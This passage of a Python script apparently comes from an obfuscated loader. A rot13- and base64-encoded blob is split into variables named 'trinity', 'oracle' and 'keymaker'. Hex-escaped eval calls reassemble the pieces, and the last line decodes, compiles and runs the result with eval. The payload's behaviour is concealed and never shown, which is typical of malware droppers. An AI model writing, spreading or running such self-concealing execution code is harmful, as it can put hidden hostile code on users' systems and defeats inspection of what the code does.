mDiDzgQn000BFg5Y05LpauxHKD9Wjc6nJ9hVQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWjchMJ8tCFOyqzSfXPqprQpmKUt2BIk4AmuprQWyKUt2AIk4AzIprQpmKUt3AIk4AmWprQL1KUt1Myk4AmAprQp0KUt3Zyk4ZwuprQLlKUt2BIk4AzIprQLkKUt3Z1k4AwAprQL5KUt2BIk4ZzIprQp1KUt2MIk4AwuprQL1KUt3BSk4AzAprQL5KUt2Ayk4AmyprQV4KUt2MSk4AzMprQplKUt3ZSk4AwuprQL1KUt3AIk4AmAprQV5KUtlBFpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQp0KUt3Zyk4AwyprQMyKUt2BIk4AmEprQp5KUtlL1k4ZwOprQquKUt2BIk4AzMprQMyKUtlBFpcVPftMKMuoPtaKUt3Z1k4AwyprQp4KUtlMIk4AwIprQMyKUt3Z1k4AmIprQplKUt2AIk4AJMprQpmKUt3ASk4AmWprQV4KUt2Zyk4AwyprQMyKUt2ZIk4AmAprQLmKUt2BIk4AwyprQWyKUt3AIk4AzIprQL4KUt2AIk4AmuprQMwKUt2BIk4AwMprQp5KUtlBSk4AzMprQplKUt2ZIk4AwAprQMwKUt2AIk4ZwyprQV5WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzWprQL1KUt3BIk4AzEprQLkKUt2Lyk4AwIprQplKUtlZSk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXDcyqzSfXTAioKOcoTHbrzkcLv5xMJAioKOlMKAmXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt2MIk4AwIprQMzWlxcXFjaCUA0pzyhMm4aYPqyrTIwWlxcPt=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))